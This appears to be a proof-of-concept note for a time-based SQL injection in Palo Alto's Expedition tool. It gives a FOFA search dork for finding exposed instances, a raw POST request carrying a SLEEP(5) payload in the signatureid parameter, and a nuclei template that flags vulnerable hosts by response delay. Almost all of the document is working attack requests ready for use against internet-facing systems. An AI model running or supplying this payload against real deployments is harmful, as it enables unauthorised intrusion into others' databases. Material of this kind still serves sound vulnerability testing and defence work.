# fofa

```plain
title="Expedition Project"
```

# poc

```yaml
POST /bin/configurations/parsers/Checkpoint/CHECKPOINT.php HTTP/1.1
Host: 
Content-Type: application/x-www-form-urlencoded

action=import&type=test&project=pandbRBAC&signatureid=1%20AND%20(SELECT%201234%20FROM%20(SELECT(SLEEP(5)))test)
```

# nuclei

```yaml
id: pan-Expedition-sqli

info:
  name: pan-Expedition-sqli
  author: zxf
  severity: high
  metadata: 
    fofasearch: title="Expedition Project"

http:
  - raw:
      - |
        POST /bin/configurations/parsers/Checkpoint/CHECKPOINT.php HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded

        action=import&type=test&project=pandbRBAC&signatureid=1%20AND%20(SELECT%201234%20FROM%20(SELECT(SLEEP(5)))test)
        
    matchers:
      - type: dsl
        dsl:
          - status_code==200 && duration >= 5
```

![img](https://cdn.nlark.com/yuque/0/2025/png/40959960/1739166356996-bf933e01-b8b2-4530-b2b9-dae57052ca37.png)

![img](https://cdn.nlark.com/yuque/0/2025/png/40959960/1739166302145-09e804f4-7dfd-44e5-b69d-a3f7400e314a.png)